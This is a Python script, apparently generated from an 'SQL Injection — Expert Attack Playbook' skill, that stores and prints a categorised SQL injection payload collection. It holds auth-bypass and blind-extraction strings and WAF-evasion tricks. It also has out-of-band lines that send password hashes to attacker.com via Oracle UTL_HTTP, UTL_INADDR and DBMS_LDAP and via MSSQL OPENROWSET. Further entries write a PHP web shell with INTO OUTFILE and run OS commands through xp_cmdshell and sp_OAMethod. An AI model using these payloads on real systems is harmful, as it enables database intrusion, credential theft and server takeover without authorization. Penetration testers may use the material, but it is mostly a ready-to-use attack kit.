#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AUTO-GENERATED from Cybermes skill: hack-skills/sqli-sql-injection

Skill: SKILL: SQL Injection — Expert Attack Playbook
Desc : >-

Run:  python hack-skills-sqli-sql-injection.py --help
      python hack-skills-sqli-sql-injection.py --list
      python hack-skills-sqli-sql-injection.py --dump <section>
"""
import sys, json, argparse

NAME = 'hack-skills/sqli-sql-injection'
TITLE = 'SKILL: SQL Injection — Expert Attack Playbook'
DESCRIPTION = '>-'

PAYLOADS = {
    'main': ["name: sqli-sql-injection", "description: >-", "SQL injection playbook. Use when input reaches SQL queries, authentication logic, sorting, filtering, reporting, or DB-specific blind and out-of-band execution paths."],
    'skill-sql-injection-expert-attack-playbook': [],
    '0-related-routing': ["- [ghost-bits-cast-attack](../ghost-bits-cast-attack/SKILL.md) when the backend is **Java with Jackson** and your SQL keywords are WAF-blocked \u2014 Jackson's `charToHex` table is indexed by `ch & 0xFF`, so a Unicode character like `\u4e30` (U+4E30) resolves to hex digit `0` inside a `\\uXXXX` escape sequence, letting you smuggle `UNION`, `SELECT`, `1`, etc. without the WAF ever seeing them"],
    '1-quick-start': [],
    'extended-scenarios': ["Also load [SCENARIOS.md](./SCENARIOS.md) when you need:", "- SMB out-of-band exfiltration via `LOAD_FILE` + UNC paths (Windows MySQL)", "- KEY injection / URI injection / non-parameter injection points", "- INSERT/DELETE/UPDATE statement injection differences", "- ThinkPHP5 array key injection (`updatexml` error-based)", "- Django GIS Oracle `utl_inaddr.get_host_name` CVE", "- ORDER BY / LIMIT injection techniques"],
    'advanced-reference': ["Also load [SQLMAP_ADVANCED.md](./SQLMAP_ADVANCED.md) when you need:", "- SQLMap tamper scripts matrix and WAF bypass tamper chain recipes (space2comment, between, charencode, etc.)", "- `--technique`, `--risk`/`--level` combinations and `--second-url` for second-order injection", "- `--os-shell` / `--os-pwn` OS-level exploitation via SQLMap", "- INSERT/UPDATE/DELETE injection patterns with data exfiltration examples", "- GraphQL + SQL injection (batched queries, nested field injection, mutation injection)", "- DB-specific advanced functions: PostgreSQL dollar-sign quoting, MSSQL linked servers, Oracle DBMS_PIPE/DBMS_SCHEDULER", "If you have only confirmed a suspicious SQL sink, do not load extra payload skills first; complete first-pass validation here."],
    'first-pass-payload-families': [],
    'small-stable-first-pass-set': ["```text", "' or 1=1--", "' or '1'='1'--", "1 or 1=1", "') or ('1'='1", "'; WAITFOR DELAY '0:0:5'--", "' AND SLEEP(5)--", "'||(SELECT pg_sleep(5))--", "1 AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)", "' order by 1--", "' union select null--"],
    'dbms-routing-hints': [],
    '1-detection-subtle-indicators': ["Most SQLi is found by **behavioral differences**, not errors:", "**Critical**: test in ALL parameter types \u2014 URL query, POST body, JSON fields, XML values, HTTP headers (X-Forwarded-For, User-Agent, Referer, Cookie values)."],
    '2-database-fingerprinting': ["```sql", "-- MySQL", "VERSION()              -- returns version string", "@@datadir              -- data directory", "@@global.secure_file_priv  -- file read restriction", "-- MSSQL", "@@VERSION              -- includes \"Microsoft SQL Server\"", "DB_NAME()              -- current database", "USER_NAME()            -- current user", "-- Oracle", "v$version              -- SELECT banner FROM v$version WHERE ROWNUM=1", "sys.database_name      -- current db (alternative)", "user                   -- current Oracle user", "-- PostgreSQL", "version()              -- returns version", "current_database()     -- current db", "current_user           -- current user", "**Error-based fingerprint**: inject `'` and read error message format. MySQL errors differ from Oracle/MSSQL."],
    '3-union-based-data-extraction': ["**Column count determination**:", "```sql", "ORDER BY 1--", "ORDER BY 2--", "ORDER BY N--   \u2190 until error = N-1 columns", "**Column type detection** (NULL is safest):", "```sql", "UNION SELECT NULL,NULL,NULL--", "UNION SELECT 'a',NULL,NULL--  \u2190 find string column", "**Database-specific string concat** (required when column accepts only int):", "```sql", "-- MySQL", "CONCAT(username,0x3a,password)", "-- MSSQL", "username+'|'+password", "-- Oracle", "username||'|'||password", "-- PostgreSQL", "username||':'||password"],
    '4-blind-injection-inference-techniques': [],
    'boolean-blind-conditional-response-difference': ["```sql", "-- Does first char of username = 'a'?", "' AND SUBSTRING(username,1,1)='a'--", "' AND ASCII(SUBSTRING(username,1,1))>96--", "-- Oracle", "' AND SUBSTR((SELECT username FROM users WHERE rownum=1),1,1)='a'--", "-- MSSQL", "' AND SUBSTRING((SELECT TOP 1 username FROM users),1,1)='a'--"],
    'time-based-blind-no-response-difference': ["```sql", "-- MSSQL (most reliable)", "'; IF (SUBSTRING(username,1,1)='a') WAITFOR DELAY '0:0:5'--", "-- MySQL", "' AND IF(SUBSTRING(username,1,1)='a',SLEEP(5),0)--", "-- Oracle", "' AND 1=(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '1' END FROM dual)--", "-- Oracle sleep alternative (no SLEEP):", "' AND 1=UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual))--", "-- PostgreSQL", "'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--"],
    '5-out-of-band-oob-exfiltration-critical': ["Use when blind injection has no time/boolean indicator, or when batch queries can't return data inline."],
    'mssql-openrowset-requires-sqloledb-outbound-tcp': ["```sql", "'; INSERT INTO OPENROWSET(", "'SQLOLEDB',", "'DRIVER={SQL Server};SERVER=attacker.com,80;UID=sa;PWD=pass',", "'SELECT * FROM foo'", ") VALUES (@@version)--", "-- Exfiltrate table data:", "'; INSERT INTO OPENROWSET(", "'SQLOLEDB',", "'DRIVER={SQL Server};SERVER=attacker.com,80;UID=sa;PWD=pass',", "'SELECT * FROM foo'", ") SELECT TOP 1 username+':'+password FROM users--", "Use **port 80 or 443** to bypass firewall egress restrictions."],
    'oracle-utl-http-http-get-with-data-in-url-path': ["```sql", "'+UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT username FROM all_users WHERE ROWNUM=1))--", "Oracle's UTL_HTTP supports proxy \u2014 can exfil through corporate proxy!"],
    'oracle-utl-inaddr-dns-exfiltration-often-bypasses-http-restrictions': ["```sql", "'+UTL_INADDR.GET_HOST_NAME((SELECT password FROM dba_users WHERE username='SYS')||'.attacker.com')--", "Attacker sees: `HASH_VALUE.attacker.com` DNS query \u2192 read password hash."],
    'oracle-utl-smtp-utl-tcp': ["```sql", "-- Email large data dumps:", "UTL_SMTP.SENDMAIL(...)  -- send query results via email", "-- Raw TCP socket:", "UTL_TCP.OPEN_CONNECTION('attacker.com', 80)"],
    'mysql-dns-via-load-file-windows-unc-path': ["```sql", "SELECT LOAD_FILE('\\\\\\\\attacker.com\\\\share')", "-- Triggers DNS lookup before connection attempt", "-- Works on Windows hosts with outbound SMB"],
    'mysql-into-outfile-in-band-filesystem-write': ["```sql", "SELECT \"<?php system($_GET['c']); ?>\" INTO OUTFILE '/var/www/html/shell.php'", "-- Requirements: FILE privilege, writable web root, secure_file_priv=''"],
    '6-escalation-os-command-execution': [],
    'mssql-xp-cmdshell-if-enabled-or-if-sysadmin': ["```sql", "'; EXEC xp_cmdshell('whoami')--", "-- Enable if disabled (requires sysadmin):", "'; EXEC sp_configure 'show advanced options',1; RECONFIGURE--", "'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE--"],
    'mysql-udf-user-defined-functions': ["Write malicious shared library to filesystem, then `CREATE FUNCTION ... SONAME`."],
    'oracle-java-stored-procedures': ["```sql", "-- Create Java class:", "EXEC dbms_java.grant_permission('SCOTT','SYS:java.io.FilePermission','<<ALL FILES>>','execute');", "-- Then exec OS commands via Java Runtime"],
    '7-second-order-injection': ["**Concept**: User input is stored safely (parameterized), but later **retrieved as trusted data** and concatenated into a new query without re-sanitization.", "**Example attack flow**:", "1. Register username: `admin'--`", "2. Application safely inserts this into users table", "3. Password change function fetches username from session (trusted!) and builds:", "```sql", "UPDATE users SET password='newpass' WHERE username='admin'--'", "4. Comment strips the condition \u2192 updates **admin's** password", "**Key insight**: Any application function that reads stored data and uses it in a new DB query is a second-order candidate. Review: password change, profile update, admin action on user data."],
    '8-parameterized-query-bypass-scenarios': ["Parameterized queries do NOT prevent SQLi when:", "1. **Table/column names are user-controlled** \u2014 params can't parameterize identifiers:", "```sql", "-- UNSAFE even with params:", "\"SELECT * FROM \" + tableName + \" WHERE id = ?\"", "Mitigation: whitelist-validate table/column names.", "2. **Partial parameterization** \u2014 some fields concatenated, others parameterized:", "```sql", "\"SELECT * FROM users WHERE type='\" + userType + \"' AND id=?\"", "-- userType not parameterized \u2192 injection", "3. **IN clause** with dynamic count (common mistake in ORMs):", "```sql", "SELECT * FROM items WHERE id IN (1, 2, ?)  -- only last is parameterized", "4. **Second-order** \u2014 data retrieved from DB assumed clean, re-used in query without params."],
    '9-filter-evasion-techniques': [],
    'comment-injection-break-keywords': ["```sql", "SEL/**/ECT", "UN/**/ION", "1 UN/**/ION ALL SEL/**/ECT NULL--"],
    'case-variation': ["```sql", "UnIoN SeLeCt"],
    'url-encoding': ["```sql", "%55NION  -- U", "%53ELECT -- S"],
    'whitespace-alternatives': ["```sql", "SELECT/**/username/**/FROM/**/users", "SELECT%09username%09FROM%09users  -- tab", "SELECT%0ausername%0aFROM%0ausers  -- newline"],
    'string-construction-bypass-literal-string-detection': ["```sql", "-- MySQL concatenation without quotes:", "CHAR(117,115,101,114,110,97,109,101)  -- 'username'", "-- Oracle:", "CHR(117)||CHR(115)||CHR(101)||CHR(114)", "-- MSSQL:", "CHAR(117)+CHAR(115)+CHAR(101)+CHAR(114)"],
    '10-database-metadata-extraction': [],
    'mysql': ["```sql", "SELECT schema_name FROM information_schema.schemata", "SELECT table_name FROM information_schema.tables WHERE table_schema=database()", "SELECT column_name FROM information_schema.columns WHERE table_name='users'"],
    'mssql': ["```sql", "SELECT name FROM master..sysdatabases", "SELECT name FROM sysobjects WHERE xtype='U'  -- user tables", "SELECT name FROM syscolumns WHERE id=OBJECT_ID('users')"],
    'oracle': ["```sql", "SELECT owner,table_name FROM all_tables", "SELECT column_name FROM all_tab_columns WHERE table_name='USERS'", "SELECT username,password FROM dba_users  -- requires DBA"],
    'postgresql': ["```sql", "SELECT datname FROM pg_database", "SELECT tablename FROM pg_tables WHERE schemaname='public'", "SELECT column_name FROM information_schema.columns WHERE table_name='users'"],
    '11-stored-procedure-abuse': [],
    'mssql-sp-oamethod-com-automation': ["```sql", "DECLARE @o INT", "EXEC sp_OACreate 'wscript.shell', @o OUT", "EXEC sp_OAMethod @o, 'run', NULL, 'cmd.exe /c whoami > C:\\out.txt'"],
    'oracle-dbms-ldap-outbound-ldap-dns-exfil': ["```sql", "SELECT DBMS_LDAP.INIT((SELECT password FROM dba_users WHERE username='SYS')||'.attacker.com',389) FROM dual"],
    '12-quick-reference-injection-test-strings': ["'                          -- break string context", "''                         -- escaped quote (test handling)", "' OR 1=1--                 -- auth bypass attempt", "' OR 'a'='a               -- alternate auth bypass", "'; SELECT 1--             -- statement termination", "' UNION SELECT NULL--     -- UNION test", "' AND 1=1--               -- boolean true", "' AND 1=2--               -- boolean false (different response \u2192 injectable)", "1; WAITFOR DELAY '0:0:3'-- -- MSSQL time delay", "1 AND SLEEP(3)--          -- MySQL time delay", "1 AND 1=dbms_pipe.receive_message(('a'),3)-- -- Oracle time delay"],
    '13-waf-bypass-matrix': ["Additional WAF bypass patterns:", "- Polyglot: `SLEEP(1)/*' or SLEEP(1) or '\" or SLEEP(1) or \"*/`", "- Routed injection: `1' UNION SELECT 0x(inner_payload_hex)-- -` where inner payload is another full query hex-encoded", "- Second Order: inject into storage, trigger when data is used in another query later", "- PDO emulated prepare: when `PDO::ATTR_EMULATE_PREPARES=true`, stacked queries work even with parameterized-looking code"],
    '14-waf-bypass-matrix': [],
    'no-space-bypass': ["```sql", "SELECT/**/username/**/FROM/**/users", "SELECT(username)FROM(users)"],
    'no-comma-bypass': ["```sql", "-- UNION with JOIN instead of comma:", "UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c", "-- SUBSTRING alternative: SUBSTRING('abc' FROM 1 FOR 1)", "-- LIMIT alternative: LIMIT 1 OFFSET 0"],
    'polyglot-injection': ["```sql", "SLEEP(1)/*' or SLEEP(1) or '\" or SLEEP(1) or \"*/"],
    'routed-injection': ["```sql", "-- First query returns string used as input to second query:", "' UNION SELECT CONCAT(0x222c,(SELECT password FROM users LIMIT 1))--", "-- The returned value becomes part of another SQL context"],
    'second-order-injection': ["-- Step 1: Register username: admin'--", "-- Step 2: Trigger password change (uses stored username in SQL)", "-- UPDATE users SET password='new' WHERE username='admin'--'"],
    'pdo-prepared-statement-edge-cases': ["```php", "// Unsafe even with PDO when query structure is dynamic:", "$pdo->query(\"SELECT * FROM \" . $_GET['table']);", "// Or when using emulated prepares with multi-query:", "$pdo->setAttribute(PDO::ATTR_EMULATE_PREPARES, true);"],
    'entry-point-detection-unicode-tricks': ["U+02BA \u02ba (modifier letter double prime) \u2192 \"", "U+02B9 \u02b9 (modifier letter prime) \u2192 '", "%%2727 \u2192 %27 \u2192 '"],
}

def main():
    ap = argparse.ArgumentParser(description=DESCRIPTION, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--list", action="store_true", help="list sections")
    ap.add_argument("--dump", metavar="SECTION", help="dump payloads for a section")
    ap.add_argument("--search", metavar="KEYWORD", help="search payloads")
    args = ap.parse_args()
    if args.list or not (args.dump or args.search):
        print("=== %s ===" % TITLE)
        print(DESCRIPTION)
        print()
        print("Sections (%d):" % len(PAYLOADS))
        for k in PAYLOADS:
            print("  -", k, "(%d payloads)" % len(PAYLOADS[k]))
        if args.list:
            return
    if args.dump:
        if args.dump not in PAYLOADS:
            print("Section not found. Available:", list(PAYLOADS.keys()))
            sys.exit(1)
        for p in PAYLOADS[args.dump]:
            print(p)
        return
    if args.search:
        q = args.search.lower()
        hits = 0
        for k, v in PAYLOADS.items():
            for p in v:
                if q in p.lower():
                    print("[%s] %s" % (k, p))
                    hits += 1
        print("\n%d hits" % hits)
        return

if __name__ == "__main__":
    main()